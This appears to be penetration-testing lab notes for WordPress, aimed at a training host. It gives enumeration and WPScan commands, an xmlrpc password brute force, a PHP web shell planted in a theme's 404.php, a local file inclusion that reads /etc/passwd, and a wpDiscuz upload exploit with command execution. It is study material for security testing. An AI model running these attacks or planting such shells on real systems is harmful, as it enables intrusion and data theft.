# WordPress - Discovery & Enumeration
## Discovery/Footprinting
- Browsing to the /robots.txt
- /wp-admin and /wp-content
- Plugins stored in the wp-content/plugins directory
- Themes are stored in the wp-content/themes directory


## Enumeration
Check the page source of other pages
```
curl -s http://blog.inlanefreight.local | grep WordPress
```
```
curl -s http://blog.inlanefreight.local/ | grep themes
```
```
curl -s http://blog.inlanefreight.local/ | grep plugins
```

### WPScan
WPScan is an automated WordPress scanner and enumeration tool. It determines if the various themes and plugins used by a blog are outdated or vulnerable. It’s installed by default on Parrot OS but can also be installed manually with gem.
```
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token <SNIP>
```

# Attacking WordPress
## Login Bruteforce
### WPScan
WPScan can be used to brute force usernames and passwords. The scan report in the previous section returned two users registered on the website (admin and john). The tool uses two kinds of login brute force attacks, xmlrpc and wp-login. The wp-login method will attempt to brute force the standard WordPress login page, while the xmlrpc method uses WordPress API to make login attempts through /xmlrpc.php. The xmlrpc method is preferred as it’s faster.
```
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```
The `--password-attack` flag is used to supply the type of attack. 
The `-U` argument takes in a list of users or a file containing user names. 
This applies to the `-P` passwords option as well.

### Code Execution
Access to WP Admin 
Appearance -> Select 404.php -> `system($_GET[0]);`-> Update File -> 
```
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```
Using Metasploit
`wp_admin_shell_upload` -> `msf6 > use exploit/unix/webapp/wp_admin_shell_upload`

## Leveraging Known Vulnerabilities

### Vulnerable Plugins - mail-masta
```
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

### Vulnerable Plugins - wpDiscuz
```
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
```
```
curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
```

## WordPress Shells
https://www.hackingarticles.in/wordpress-reverse-shell/
